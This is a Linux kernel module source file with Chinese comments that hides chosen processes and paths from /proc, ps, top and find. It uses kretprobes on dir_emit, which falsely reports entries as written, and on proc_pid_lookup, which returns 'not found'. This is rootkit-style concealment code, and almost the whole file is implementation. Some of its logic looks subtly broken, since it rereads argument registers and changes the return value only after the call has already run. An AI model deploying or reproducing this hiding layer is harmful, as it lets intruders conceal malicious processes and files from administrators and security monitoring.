// SPDX-License-Identifier: GPL-2.0
/*
 * mem_hide.c —— 进程 / 路径 隐藏 (enkernel 新增层)
 *
 * 思路:
 *   /proc 的每一条目录项最终都通过 dir_emit() / dir_emit_dots() 写进用户
 *   缓冲。把 dir_emit 挂上 kprobe, 在它真正写入之前判断"这条是不是要藏
 *   的东西", 是就直接把返回值改成"已写" —— 调用方以为写成功了, 但用户
 *   态缓冲里根本没有这一条。这样 ps / top / find / 自写枚举全部看不到。
 *
 *   比起 hook proc_pid_readdir 再回头压缩 dirent 块, 这个做法:
 *     * 不依赖 proc_fill_cache 的内部布局, 跨内核版本更稳;
 *     * 不需要知道 dir_context 的缓冲指针;
 *     * 一条一条判断, 不会把相邻条目挤坏。
 *
 *   路径隐藏同理: 在 dir_emit 里比对 d_name, 命中隐藏表就吞掉。
 *
 * 与 lookup 层配合:
 *   proc_pid_lookup 的 kretprobe 在目标 pid 被隐藏时把返回值改成 -ENOENT,
 *   挡住 "open('/proc/<pid>/cmdline')" 这种按 pid 直连的访问。
 *
 * 明确的能力边界:
 *   * 内核态 for_each_process() 仍然能枚举到进程 —— 本模块不动 task 链表,
 *     那是另一个可见性层面, 改动风险远高于收益。
 *   * 隐藏前已经打开的 fd 不受影响。
 *   * /proc/<pid>/exe 的符号链接内容无法修改, 只能阻止 lookup。
 *   * 隐藏表存在内存里, 模块卸载即清空, 不落盘。
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": hide: " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/sched.h>
#include <linux/capability.h>

#include "abi.h"
#include "mem_hide.h"

#if defined(CONFIG_ARM64)
#define ARG0(regs) ((regs)->regs[0])
#define ARG1(regs) ((regs)->regs[1])
#define ARG2(regs) ((regs)->regs[2])
#define ARG3(regs) ((regs)->regs[3])
#define SET_RET(regs, v) ((regs)->regs[0] = (unsigned long)(v))
#elif defined(CONFIG_X86_64)
#define ARG0(regs) ((regs)->di)
#define ARG1(regs) ((regs)->si)
#define ARG2(regs) ((regs)->dx)
#define ARG3(regs) ((regs)->cx)
#define SET_RET(regs, v) ((regs)->ax = (unsigned long)(v))
#else
#error "mem_hide: unsupported architecture"
#endif

/* ------------------------------------------------------------------ */
/*  隐藏表                                                            */
/* ------------------------------------------------------------------ */

struct hide_state {
    spinlock_t lock;
    int      pids[MEM_HIDE_MAX_PIDS];
    uint32_t pid_count;
    char     paths[MEM_HIDE_MAX_PATHS][MEM_HIDE_PATH_LEN];
    uint32_t path_count;
};

static struct hide_state g_hide;

static bool hide_pid_contains(int pid)
{
    uint32_t i;
    bool hit = false;

    spin_lock(&g_hide.lock);
    for (i = 0; i < g_hide.pid_count; i++) {
        if (g_hide.pids[i] == pid) {
            hit = true;
            break;
        }
    }
    spin_unlock(&g_hide.lock);
    return hit;
}

/* d_name 命中隐藏路径表 (只比对最后一段) */
static bool hide_path_contains(const char *name)
{
    uint32_t i;
    bool hit = false;

    if (!name || !*name)
        return false;

    spin_lock(&g_hide.lock);
    for (i = 0; i < g_hide.path_count; i++) {
        const char *p = strrchr(g_hide.paths[i], '/');
        const char *leaf = p ? p + 1 : g_hide.paths[i];
        if (leaf[0] && strncmp(leaf, name, MEM_HIDE_PATH_LEN) == 0) {
            hit = true;
            break;
        }
    }
    spin_unlock(&g_hide.lock);
    return hit;
}

/* ------------------------------------------------------------------ */
/*  dir_emit kprobe: 目录项写入前拦截                                  */
/* ------------------------------------------------------------------ */
//
// dir_emit(struct dir_context *ctx, const char *name, int namelen,
//          u64 ino, unsigned type) -> bool
//
// 返回 true 表示"已写" —— 我们对被隐藏的条目谎报成功, 用户态缓冲里
// 就不会出现它。

struct emit_inst {
    bool numeric;
    int  pid;
    bool swallow;
};

static int emit_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct emit_inst *inst = (struct emit_inst *) ri->data;
    const char *name = (const char *) ARG1(regs);
    int namelen = (int) ARG2(regs);

    inst->numeric = false;
    inst->pid = 0;
    inst->swallow = false;

    if (!name || namelen <= 0 || namelen > 64)
        return 0;

    /* 纯数字 = pid 目录 */
    {
        int i;
        int v = 0;
        bool all_digit = true;
        for (i = 0; i < namelen; i++) {
            const char c = name[i];
            if (c < '0' || c > '9') {
                all_digit = false;
                break;
            }
            v = v * 10 + (c - '0');
            if (v > 4194304) {
                all_digit = false;
                break;
            }
        }
        if (all_digit && i == namelen) {
            inst->numeric = true;
            inst->pid = v;
        }
    }

    return 0;
}

static int emit_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct emit_inst *inst = (struct emit_inst *) ri->data;
    const char *name = (const char *) ARG1(regs);
    int namelen = (int) ARG2(regs);

    if (inst->numeric && hide_pid_contains(inst->pid))
        inst->swallow = true;
    else if (name && namelen > 0 && namelen < MEM_HIDE_PATH_LEN) {
        char leaf[64];
        if (namelen < (int) sizeof(leaf)) {
            memcpy(leaf, name, namelen);
            leaf[namelen] = '\0';
            if (hide_path_contains(leaf))
                inst->swallow = true;
        }
    }

    if (inst->swallow)
        SET_RET(regs, 1);   /* 谎报"已写入" */

    return 0;
}

static struct kretprobe g_emit_krp = {
    .kp.symbol_name = "dir_emit",
    .entry_handler  = emit_entry,
    .handler        = emit_ret,
    .data_size      = sizeof(struct emit_inst),
    .maxactive      = 64,
};

/* ------------------------------------------------------------------ */
/*  proc_pid_lookup kretprobe: 按 pid 直连时返回 -ENOENT              */
/* ------------------------------------------------------------------ */

struct lookup_inst {
    char name[16];
    bool numeric;
};

static int lookup_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct lookup_inst *inst = (struct lookup_inst *) ri->data;
    const unsigned char *name = (const unsigned char *) ARG0(regs);

    inst->numeric = false;
    memset(inst->name, 0, sizeof(inst->name));
    if (!name)
        return 0;

    {
        int i = 0;
        while (i < (int) sizeof(inst->name) - 1 && name[i] &&
               name[i] != '/') {
            inst->name[i] = (char) name[i];
            i++;
        }
        inst->name[i] = '\0';
        if (i > 0) {
            bool all_digit = true;
            for (int k = 0; k < i; k++) {
                if (inst->name[k] < '0' || inst->name[k] > '9') {
                    all_digit = false;
                    break;
                }
            }
            inst->numeric = all_digit;
        }
    }
    return 0;
}

static int lookup_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct lookup_inst *inst = (struct lookup_inst *) ri->data;
    int pid = 0;
    const char *p = inst->name;

    if (!inst->numeric)
        return 0;

    while (*p >= '0' && *p <= '9') {
        pid = pid * 10 + (*p - '0');
        p++;
    }
    if (pid > 0 && hide_pid_contains(pid))
        SET_RET(regs, -ENOENT);

    return 0;
}

static struct kretprobe g_lookup_krp = {
    .kp.symbol_name = "proc_pid_lookup",
    .entry_handler  = lookup_entry,
    .handler        = lookup_ret,
    .data_size      = sizeof(struct lookup_inst),
    .maxactive      = 32,
};

/* ------------------------------------------------------------------ */
/*  对外接口                                                          */
/* ------------------------------------------------------------------ */

static bool caller_is_privileged(void)
{
    return capable(CAP_SYS_ADMIN) || capable(CAP_SYS_PTRACE);
}

long mem_hide_process(void __user *arg)
{
    struct mem_hide_pid_req req;
    uint32_t i;

    if (!caller_is_privileged())
        return -EPERM;
    if (copy_from_user(&req, arg, sizeof(req)))
        return -EFAULT;

    if (req.pid <= 0)
        req.pid = current->pid;

    spin_lock(&g_hide.lock);
    if (req.hide) {
        bool exists = false;
        for (i = 0; i < g_hide.pid_count; i++) {
            if (g_hide.pids[i] == req.pid) {
                exists = true;
                break;
            }
        }
        if (!exists) {
            if (g_hide.pid_count >= MEM_HIDE_MAX_PIDS) {
                spin_unlock(&g_hide.lock);
                return -ENOSPC;
            }
            g_hide.pids[g_hide.pid_count++] = req.pid;
        }
    } else {
        for (i = 0; i < g_hide.pid_count; i++) {
            if (g_hide.pids[i] == req.pid) {
                g_hide.pids[i] = g_hide.pids[--g_hide.pid_count];
                break;
            }
        }
    }
    req.out_hidden_count = g_hide.pid_count;
    spin_unlock(&g_hide.lock);

    if (copy_to_user(arg, &req, sizeof(req)))
        return -EFAULT;

    pr_info("pid %d %s, total %u\n", req.pid,
            req.hide ? "hidden" : "unhidden", req.out_hidden_count);
    return 0;
}

long mem_hide_path(void __user *arg)
{
    struct mem_hide_path_req req;
    uint32_t i;

    if (!caller_is_privileged())
        return -EPERM;
    if (copy_from_user(&req, arg, sizeof(req)))
        return -EFAULT;

    req.path[MEM_HIDE_PATH_LEN - 1] = '\0';
    if (req.path[0] != '/')
        return -EINVAL;

    spin_lock(&g_hide.lock);
    if (req.hide) {
        bool exists = false;
        for (i = 0; i < g_hide.path_count; i++) {
            if (strncmp(g_hide.paths[i], req.path, MEM_HIDE_PATH_LEN) == 0) {
                exists = true;
                break;
            }
        }
        if (!exists) {
            if (g_hide.path_count >= MEM_HIDE_MAX_PATHS) {
                spin_unlock(&g_hide.lock);
                return -ENOSPC;
            }
            strncpy(g_hide.paths[g_hide.path_count], req.path,
                    MEM_HIDE_PATH_LEN - 1);
            g_hide.path_count++;
        }
    } else {
        for (i = 0; i < g_hide.path_count; i++) {
            if (strncmp(g_hide.paths[i], req.path, MEM_HIDE_PATH_LEN) == 0) {
                g_hide.path_count--;
                if (i != g_hide.path_count)
                    memcpy(g_hide.paths[i], g_hide.paths[g_hide.path_count],
                           MEM_HIDE_PATH_LEN);
                memset(g_hide.paths[g_hide.path_count], 0, MEM_HIDE_PATH_LEN);
                break;
            }
        }
    }
    req.out_hidden_count = g_hide.path_count;
    spin_unlock(&g_hide.lock);

    if (copy_to_user(arg, &req, sizeof(req)))
        return -EFAULT;

    pr_info("path %s %s, total %u\n", req.path,
            req.hide ? "hidden" : "unhidden", req.out_hidden_count);
    return 0;
}

long mem_hide_list(void __user *arg)
{
    /*
     * struct mem_hide_list_req 是 16*128 + 32*4 + 8 = 2184 字节,
     * 直接放栈上会超过内核的 -Wframe-larger-than=2048 限制
     * (实测报 2240 字节)。改用 kzalloc 堆分配。
     */
    struct mem_hide_list_req *req;
    uint32_t i;
    long ret = 0;

    if (!caller_is_privileged())
        return -EPERM;

    req = kzalloc(sizeof(*req), GFP_KERNEL);
    if (!req)
        return -ENOMEM;

    spin_lock(&g_hide.lock);
    req->out_pid_count = g_hide.pid_count;
    for (i = 0; i < g_hide.pid_count && i < MEM_HIDE_MAX_PIDS; i++)
        req->out_pids[i] = (uint32_t) g_hide.pids[i];
    req->out_path_count = g_hide.path_count;
    for (i = 0; i < g_hide.path_count && i < MEM_HIDE_MAX_PATHS; i++)
        memcpy(req->out_paths[i], g_hide.paths[i], MEM_HIDE_PATH_LEN);
    spin_unlock(&g_hide.lock);

    if (copy_to_user(arg, req, sizeof(*req)))
        ret = -EFAULT;

    kfree(req);
    return ret;
}

int mem_hide_init(void)
{
    int rc;

    spin_lock_init(&g_hide.lock);
    g_hide.pid_count = 0;
    g_hide.path_count = 0;
    memset(g_hide.pids, 0, sizeof(g_hide.pids));
    memset(g_hide.paths, 0, sizeof(g_hide.paths));

    rc = register_kretprobe(&g_emit_krp);
    if (rc < 0) {
        pr_err("register kprobe dir_emit failed: %d\n", rc);
        return rc;
    }

    rc = register_kretprobe(&g_lookup_krp);
    if (rc < 0) {
        pr_warn("register kprobe proc_pid_lookup failed: %d "
                "(directory listing still filtered)\n", rc);
    }

    pr_info("ready (emit=%s lookup=%s)\n",
            g_emit_krp.kp.addr ? "ok" : "mr",
            g_lookup_krp.kp.addr ? "ok" : "mr");
    return 0;
}

void mem_hide_exit(void)
{
    unregister_kretprobe(&g_lookup_krp);
    unregister_kretprobe(&g_emit_krp);
    g_hide.pid_count = 0;
    g_hide.path_count = 0;
    pr_info("exited\n");
}
